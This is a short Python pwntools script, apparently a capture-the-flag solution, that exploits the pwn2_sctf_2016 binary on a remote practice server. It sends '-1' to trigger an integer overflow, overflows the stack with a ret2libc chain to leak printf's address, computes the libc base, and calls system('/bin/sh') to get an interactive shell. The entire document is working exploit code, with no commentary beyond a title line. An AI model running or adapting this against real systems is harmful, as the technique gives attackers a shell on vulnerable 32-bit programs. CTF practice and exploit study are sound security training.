#Made by fly_autumn
#x86 ret2libc integar overflow
from pwn import *
#p = process("./pwn2_sctf_2016")
p = remote("node5.buuoj.cn",25676)
elf = ELF("./pwn2_sctf_2016")
context(os="linux",arch="i386")
libc = ELF("./libc.so.6")

offset = 48
start_plt = 0x80483d0
printf_plt = elf.plt["printf"]
printf_got = elf.got["printf"]

p.recvuntil(b"read? ")
p.sendline(b"-1")
p.recvline()
payload = b"A" * offset + p32(printf_plt) + p32(start_plt) + p32(0x80486f8) + p32(printf_got)
p.sendline(payload)
p.recvline()
p.recvuntil(b"said: ")

printf_addr = u32(p.recv(4))
log.success("printf addr: "+hex(printf_addr))
libc_addr = printf_addr - libc.sym["printf"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

p.recvuntil(b"read? ")
p.sendline(b"-1")
p.recvline()
payload = b"A" * offset + p32(sys_addr) + p32(start_plt) + p32(sh_addr)
p.sendline(payload)
#gdb.attach(p)

p.interactive()
